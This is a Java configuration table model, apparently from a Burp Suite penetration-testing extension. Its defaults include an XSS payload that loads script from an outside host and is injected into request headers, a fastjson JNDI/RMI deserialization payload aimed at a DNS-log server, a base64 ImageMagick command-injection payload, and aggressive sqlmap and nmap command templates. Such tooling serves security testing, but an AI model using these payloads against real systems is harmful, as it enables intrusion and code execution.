package config;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import javax.swing.event.TableModelEvent;
import javax.swing.event.TableModelListener;
import javax.swing.table.AbstractTableModel;

import burp.BurpExtender;
import burp.Utils;


public class ConfigTableModel extends AbstractTableModel{
	//https://stackoverflow.com/questions/11553426/error-in-getrowcount-on-defaulttablemodel
	//when use DefaultTableModel, getRowCount encounter NullPointerException. why?
	/**
	 * LineTableModel中数据如果类型不匹配，或者有其他问题，可能导致图形界面加载异常！
	 */
	private static final long serialVersionUID = 1L;
	private List<ConfigEntry> configEntries = new ArrayList<>();
	public static final String[] titles = new String[] {
			"#", "Key", "Value", "Type", "Enable", "Comment"
	};

	public static final String Firefox_Mac = "/Applications/Firefox.app/Contents/MacOS/firefox";
	public static final String Firefox_Windows = "D:\\Program Files\\Mozilla Firefox\\firefox.exe";

	// /usr/local/bin 本地默认可执行文件路径
	public static final String SQLMap_Command = "python /usr/local/bin/sqlmap-dev/sqlmap.py -r {RequestAsFile} --force-ssl --risk=3 --level=3";
	public static final String Nmap_Command = "nmap -Pn -sT -sV --min-rtt-timeout 1ms "
			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {Host}";

	private static final String Robot_Input_Comment = "this config effects how sqlmap and nmap runs";

	public ConfigTableModel(){

		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false));
		configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,true,false));
		if (Utils.isMac()) {
			configEntries.add(new ConfigEntry("browserPath", Firefox_Mac,ConfigEntry.Config_Basic_Variable,true,false));
		}else {
			configEntries.add(new ConfigEntry("browserPath", Firefox_Windows,ConfigEntry.Config_Basic_Variable,true,false));
		}
		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
		//configEntries.add(new ConfigEntry("DismissedTargets", "{\"*.firefox.com\":\"Drop\",\"*.mozilla.com\":\"Drop\"}",ConfigEntry.Config_Basic_Variable,true,false));
		//configEntries.add(new ConfigEntry("DismissedAutoForward", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
		//configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
		//configEntries.add(new ConfigEntry("DismissedURL", "",ConfigEntry.Config_Basic_Variable,true,false));
		//configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));

		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Run_External_Cmd,true,true));
		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Run_External_Cmd,true,false));
		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,Robot_Input_Comment));
		}else {
			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,Robot_Input_Comment));
		}

		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));

		//configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
		//configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
		//以上都是固定基础变量，不需要修改名称和类型

		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,true));
		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,true));
		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,true));
		configEntries.add(new ConfigEntry("OPTIONS", "",ConfigEntry.Action_Forward_And_Hide_Options,true,true));

		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true,true));
		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src={dnslogserver}/{host}>",ConfigEntry.Action_Append_To_header_value,true,true));
		//configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));

		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{host}.fastjson.{dnslogserver}/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));

		configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));

		configEntries.add(new ConfigEntry("*.firefox.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
		configEntries.add(new ConfigEntry("*.mozilla.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
		configEntries.add(new ConfigEntry("*.mozilla.org", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
		configEntries.add(new ConfigEntry("*.mozilla.net", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
	}

	public void addListener() {
		this.addTableModelListener(new TableModelListener() {

			@Override
			public void tableChanged(TableModelEvent e) {
				BurpExtender.saveConfigToBurp();
			}
		});
	}

	public List<String> getConfigJsons(){
		List<String> result = new ArrayList<String>();
		for(ConfigEntry line:configEntries) {
			String linetext = line.ToJson();
			result.add(linetext);
		}
		return result;
	}


	public List<ConfigEntry> getConfigByType(String type) {

		List<ConfigEntry> result = new ArrayList<>();
		for (ConfigEntry entry:configEntries) {
			if (entry.getType().equals(type) && entry.isEnable()) {
				result.add(entry);
			}
		}
		return result;
	}

	public ConfigEntry getConfigByKey(String key) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key) && entry.isEnable()) {
				return entry;
			}
		}
		return null;
	}


	public String getConfigValueByKey(String key) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key) && entry.isEnable()) {
				return entry.getValue();
			}
		}
		return null;
	}

	public String getConfigTypeByKey(String key) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key) && entry.isEnable()) {
				return entry.getType();
			}
		}
		return null;
	}

	/**
	 * 用于构建最终配置value，比如{host} {dnslogserver}等等
	 * @return
	 */
	public List<ConfigEntry> getBasicConfigVars(){
		List<ConfigEntry> result = new ArrayList<>();
		for (ConfigEntry entry:configEntries) {
			if (entry.isEnable() && entry.getType().equals(ConfigEntry.Config_Basic_Variable) ) {
				result.add(entry);
			}
		}
		return result;
	}
	public Set<String> getConfigValueSetByKey(String key) {
		Set<String> result = new HashSet<>();
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key) && entry.isEnable()) {
				String tmp = entry.getValue().trim();
				if (!tmp.equals("")){
					String[] tmpArray = tmp.split(",");
					for (String url:tmpArray){
						result.add(url.trim());
					}
					//result.addAll(Arrays.asList(tmpArray));
				}
			}
		}
		return result;
	}

	public void setConfigByKey(String key,String value) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key)) {
				int index = configEntries.indexOf(entry);
				entry.setValue(value);
				configEntries.set(index,entry);
				fireTableRowsUpdated(index,index);
			}
		}
	}


	public void setConfigValueSetByKey(String key,Set<String> vauleSet) {
		for (ConfigEntry entry:configEntries) {
			if (entry.getKey().equals(key)) {
				int index = configEntries.indexOf(entry);

				String valueStr = vauleSet.toString();
				valueStr = valueStr.replace("[", "");
				valueStr = valueStr.replace("]", "");
				valueStr = valueStr.replaceAll(" ","");

				entry.setValue(valueStr);
				configEntries.set(index,entry);
				fireTableRowsUpdated(index,index);
			}
		}
	}

	////////////////////// extend AbstractTableModel////////////////////////////////

	@Override
	public int getColumnCount()
	{
		return titles.length;
	}

	@Override
	public Class<?> getColumnClass(int columnIndex)
	{
		if (titles[columnIndex].equals("#")) {
			return Integer.class;//index
		}else if (titles[columnIndex].equals("Enable")) {
			return boolean.class;//enable
		}else {
			return String.class;
		}
	}

	@Override
	public int getRowCount()
	{
		return configEntries.size();
	}

	//define header of table???
	@Override
	public String getColumnName(int columnIndex) {
		if (columnIndex >= 0 && columnIndex <= titles.length) {
			return titles[columnIndex];
		}else {
			return "";
		}
	}

	@Override
	public boolean isCellEditable(int rowIndex, int columnIndex) {
		ConfigEntry entry = configEntries.get(rowIndex);
		if (!entry.isEditable()) {
			if (titles[columnIndex].equals("Key")) {
				return false;
			}else if (titles[columnIndex].equals("Type")) {
				return false;
			}
		}
		return true;
	}

	@Override
	public Object getValueAt(int rowIndex, int columnIndex)
	{
		ConfigEntry entry = configEntries.get(rowIndex);
		//"#", "Key", "Value", "Type", "Enable", "Comment"
		if (titles[columnIndex].equals("#")) {
			return rowIndex;
		}else if (titles[columnIndex].equals("Key")) {
			return entry.getKey();
		}else if (titles[columnIndex].equals("Value")) {
			return entry.getValue();
		}else if (titles[columnIndex].equals("Type")) {
			return entry.getType();
		}else if (titles[columnIndex].equals("Enable")) {
			return entry.isEnable();
		}else if (titles[columnIndex].equals("Comment")) {
			return entry.getComment();
		}else{
			return "";
		}
	}


	/*
	 * Don't need to implement this method unless your table's
	 * data can change.
	 */
	@Override
	public void setValueAt(Object value, int row, int columnIndex) {
		ConfigEntry entry = configEntries.get(row);

		if (titles[columnIndex].equals("#")) {

		}else if (titles[columnIndex].equals("Key")) {
			entry.setKey((String) value);
		}else if (titles[columnIndex].equals("Value")) {
			entry.setValue((String) value);
		}else if (titles[columnIndex].equals("Type")) {
			entry.setType((String) value);
		}else if (titles[columnIndex].equals("Enable")) {
			entry.setEnable((boolean)value);
		}else if (titles[columnIndex].equals("Comment")) {
			entry.setComment((String) value);
		}
		fireTableCellUpdated(row, columnIndex);
	}

	//////////////////////extend AbstractTableModel////////////////////////////////

	public void addNewConfigEntry(ConfigEntry lineEntry){
		PrintWriter stdout = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
		synchronized (configEntries) {
			configEntries.add(lineEntry);
			int row = configEntries.size();
			//fireTableRowsInserted(row, row);
			//need to use row-1 when add setRowSorter to table. why??
			//https://stackoverflow.com/questions/6165060/after-adding-a-tablerowsorter-adding-values-to-model-cause-java-lang-indexoutofb
			//fireTableRowsInserted(row-1, row-1);
			fireTableRowsInserted(row-2, row-2);
		}
	}


	public void removeConfigEntry(ConfigEntry lineEntry){
		PrintWriter stdout = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
		synchronized (configEntries) {
			int index = configEntries.indexOf(lineEntry);
			if (index != -1) {
				configEntries.remove(lineEntry);
				fireTableRowsDeleted(index, index);
			}
		}
	}

	public void removeRows(int[] rows) {
		PrintWriter stdout1 = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
		synchronized (configEntries) {
			//because thread let the delete action not in order, so we must loop in here.
			//list length and index changed after every remove.the origin index not point to right item any more.
			Arrays.sort(rows); //升序
			for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
				ConfigEntry config = configEntries.get(rows[i]);
				String key = config.getKey();
				updateConflictItem(key);//如果存在冲突值，更新

				configEntries.remove(rows[i]);
				stdout1.println("!!! "+key+" deleted");
				this.fireTableRowsDeleted(rows[i], rows[i]);
			}
		}

	}

	public void updateConflictItem(String key) {
		for (ConfigEntry item:configEntries){
			String keytmp = item.getKey();
			if (keytmp.equalsIgnoreCase(key+"[Conflict]")) {
				int index = configEntries.indexOf(item);
				item.setKey(key);
				this.fireTableRowsUpdated(index, index);
			}
		}
	}


	public void updateRows(int[] rows) {
		synchronized (configEntries) {
			//because thread let the delete action not in order, so we must loop in here.
			//list length and index changed after every remove.the origin index not point to right item any more.
			Arrays.sort(rows); //升序
			for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
				ConfigEntry checked = configEntries.get(rows[i]);
				configEntries.remove(rows[i]);
				configEntries.add(rows[i], checked);
			}
			this.fireTableRowsUpdated(rows[0], rows[rows.length-1]);
		}
	}

	public List<ConfigEntry> getConfigEntries() {
		return configEntries;
	}


	public void setConfigEntries(List<ConfigEntry> configEntries) {
		this.configEntries = configEntries;
	}


	/**
	 * 获取所有对数据包进行修改的规则，除了drop和forward规则。
	 * @return
	 */
	public static List<ConfigEntry> getAllChangeRules() {
		List<ConfigEntry> result = new ArrayList<ConfigEntry>();
		List<ConfigEntry> entries = GUI.tableModel.getConfigEntries();
		for (ConfigEntry entry:entries) {
			if (entry.isActionType()) {
				if (!entry.isDropOrForwardActionType()) {
					result.add(entry);
				}
			}
		}
		return result;
	}

	/**
	 *
	 * @param newrule
	 */
	public void delSameRule(ConfigEntry newrule) {
		for (int i= configEntries.size()-1;i>=0;i--) {
			ConfigEntry entry = configEntries.get(i);
			if (entry.getKey().equalsIgnoreCase(newrule.getKey()) &&
					entry.getValue().equals(newrule.getValue()) &&
					entry.getType().equals(newrule.getType())) {
				GUI.tableModel.removeConfigEntry(entry);
			}
		}
	}


	public void delRuleWithSameKeyAndValue(ConfigEntry newrule) {
		for (int i= configEntries.size()-1;i>=0;i--) {
			ConfigEntry entry = configEntries.get(i);
			if (entry.getKey().equalsIgnoreCase(newrule.getKey()) &&
					entry.getValue().equals(newrule.getValue())) {
				GUI.tableModel.removeConfigEntry(entry);
			}
		}
	}


	public void delRuleWithSameKey(ConfigEntry newrule) {
		for (int i= configEntries.size()-1;i>=0;i--) {
			ConfigEntry entry = configEntries.get(i);
			if (entry.getKey().equalsIgnoreCase(newrule.getKey())) {
				GUI.tableModel.removeConfigEntry(entry);
			}
		}
	}
}